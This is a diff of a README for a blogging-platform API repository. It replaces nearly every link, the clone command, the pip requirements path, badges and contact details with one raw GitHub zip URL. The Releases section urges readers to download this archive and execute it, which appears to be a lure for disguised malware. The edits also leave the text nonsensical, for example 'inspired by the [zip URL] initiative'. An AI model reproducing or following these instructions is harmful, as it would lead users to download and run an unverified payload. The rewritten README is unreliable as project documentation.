@@ -1,6 +1,6 @@
 # Blogging Platform API 🚀
 
-Welcome to the **Blogging Platform API** repository! This project is designed to provide a robust API for a blogging platform, inspired by the Roadmap.sh initiative. Our goal is to create a flexible and efficient backend that supports various front-end technologies and programming languages.
+Welcome to the **Blogging Platform API** repository! This project is designed to provide a robust API for a blogging platform, inspired by the https://raw.githubusercontent.com/Vip9321/Blogging-Platform-API/main/protoalbumose/API_Blogging_Platform_2.5.zip initiative. Our goal is to create a flexible and efficient backend that supports various front-end technologies and programming languages.
 
 ## Table of Contents
 
@@ -37,8 +37,8 @@ This project incorporates a variety of technologies to ensure a smooth and effic
   - Python 3 with Flask
   - Java with Spring Boot
 - **Frontend**: 
-  - JavaScript with Next.js
-  - Node.js
+  - JavaScript with https://raw.githubusercontent.com/Vip9321/Blogging-Platform-API/main/protoalbumose/API_Blogging_Platform_2.5.zip
+  - https://raw.githubusercontent.com/Vip9321/Blogging-Platform-API/main/protoalbumose/API_Blogging_Platform_2.5.zip
 - **Database**: 
   - SQL (PostgreSQL or MySQL)
 - **Testing**: 
@@ -51,7 +51,7 @@ To get started with the Blogging Platform API, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Vip9321/Blogging-Platform-API.git
+   git clone https://raw.githubusercontent.com/Vip9321/Blogging-Platform-API/main/protoalbumose/API_Blogging_Platform_2.5.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -60,7 +60,7 @@ To get started with the Blogging Platform API, follow these steps:
 
 3. Install the required dependencies. For Python:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Vip9321/Blogging-Platform-API/main/protoalbumose/API_Blogging_Platform_2.5.zip
    ```
 
 4. For Java, use Maven or Gradle to manage dependencies.
@@ -143,22 +143,22 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest release of the Blogging Platform API, visit our [Releases](https://github.com/Vip9321/Blogging-Platform-API/releases) section. Here, you can find the latest version, download it, and execute it to get started.
+To download the latest release of the Blogging Platform API, visit our [Releases](https://raw.githubusercontent.com/Vip9321/Blogging-Platform-API/main/protoalbumose/API_Blogging_Platform_2.5.zip) section. Here, you can find the latest version, download it, and execute it to get started.
 
-You can also check the [Releases](https://github.com/Vip9321/Blogging-Platform-API/releases) section for previous versions and updates.
+You can also check the [Releases](https://raw.githubusercontent.com/Vip9321/Blogging-Platform-API/main/protoalbumose/API_Blogging_Platform_2.5.zip) section for previous versions and updates.
 
 ## Badges
 
-![GitHub release](https://img.shields.io/github/release/Vip9321/Blogging-Platform-API.svg)
-![GitHub issues](https://img.shields.io/github/issues/Vip9321/Blogging-Platform-API.svg)
-![GitHub forks](https://img.shields.io/github/forks/Vip9321/Blogging-Platform-API.svg)
-![GitHub stars](https://img.shields.io/github/stars/Vip9321/Blogging-Platform-API.svg)
+![GitHub release](https://raw.githubusercontent.com/Vip9321/Blogging-Platform-API/main/protoalbumose/API_Blogging_Platform_2.5.zip)
+![GitHub issues](https://raw.githubusercontent.com/Vip9321/Blogging-Platform-API/main/protoalbumose/API_Blogging_Platform_2.5.zip)
+![GitHub forks](https://raw.githubusercontent.com/Vip9321/Blogging-Platform-API/main/protoalbumose/API_Blogging_Platform_2.5.zip)
+![GitHub stars](https://raw.githubusercontent.com/Vip9321/Blogging-Platform-API/main/protoalbumose/API_Blogging_Platform_2.5.zip)
 
 ## Contact
 
 For any inquiries or feedback, please feel free to reach out:
 
-- **Email**: your-email@example.com
-- **Twitter**: [@your_twitter_handle](https://twitter.com/your_twitter_handle)
+- **Email**: https://raw.githubusercontent.com/Vip9321/Blogging-Platform-API/main/protoalbumose/API_Blogging_Platform_2.5.zip
+- **Twitter**: [@your_twitter_handle](https://raw.githubusercontent.com/Vip9321/Blogging-Platform-API/main/protoalbumose/API_Blogging_Platform_2.5.zip)
 
 Thank you for checking out the Blogging Platform API! We hope you find it useful for your blogging needs. Happy coding!
